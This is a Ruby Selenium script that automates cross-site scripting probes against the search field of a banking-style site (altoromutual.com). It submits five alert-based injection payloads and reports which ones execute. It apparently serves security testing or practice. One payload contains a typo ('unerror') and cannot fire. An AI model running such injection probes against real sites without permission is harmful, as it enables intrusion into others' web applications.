#!/usr/bin/env ruby

require 'selenium-webdriver'

payloads =
  [
    "<video src=x onerror=alert(1);>",
    "<img src=x unerror='alert(2)'>",
    "<script>alert(3)</script>",
    "javascript:alert(5)",
    "alert(/6/.source)"
  ]

browser = Selenium::WebDriver.for :chrome
browser.manage.window.resize_to(500, 400)
browser.get "http://www.altoromutual.com/search.aspx?"

wait = Selenium::WebDriver::Wait.new(:timeout => 10)

payloads.each do |payload|
  input = wait.until do
    element = browser.find_element(:name, 'txtSearch')
    element if element.displayed?
  end
  input.send_keys(payload)
  input.submit

  begin
    wait.until do
      txt = browser.switch_to.alert
      if (1..100) === txt.text.to_i
        puts "Payload is working: #{payload}"
        txt.accept
      end
    end
  rescue Selenium::WebDriver::Error::NoAlertOpenError
    puts "False Positive: #{payload}"
    next
  end

end

browser.close
